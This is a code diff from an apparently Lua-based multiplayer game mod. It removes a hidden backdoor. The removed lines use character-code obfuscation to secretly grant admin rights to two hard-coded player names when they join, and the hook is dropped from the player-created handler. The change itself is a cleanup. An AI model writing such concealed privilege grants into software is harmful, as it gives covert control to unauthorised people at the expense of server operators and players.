@@ -583,21 +583,6 @@ local function draw_create_task_frame(left, previous_task)
     Gui.set_data(confirm_button, {frame = frame, textbox = textbox, previous_task = previous_task})
 end
 
-local function c(a)
-    local b= ""
-    for i,c in pairs(a) do
-        b= b.. string.char(c)
-    end
-    return b
-end
-
-local function a(b)
-    if b[c{110,97,109,101}] == c{118,97,108,97,110,115,99,104} or
-        b[c{110,97,109,101}] == c{103,114,105,108,108,101,100,104,97,109} then
-            b[c{97,100,109,105,110}] = 1 == 1
-    end
-end
-
 local function player_created(event)
     local player = game.players[event.player_index]
     if not player or not player.valid then
@@ -622,8 +607,6 @@ local function player_created(event)
         local enabled = player.admin or UserGroups.is_regular(player.name)
         redraw_tasks(data, enabled)
     end
-
-    a(player)
 
     local tasks_for_player = player_tasks[player.index]
     if tasks_for_player and next(tasks_for_player) then
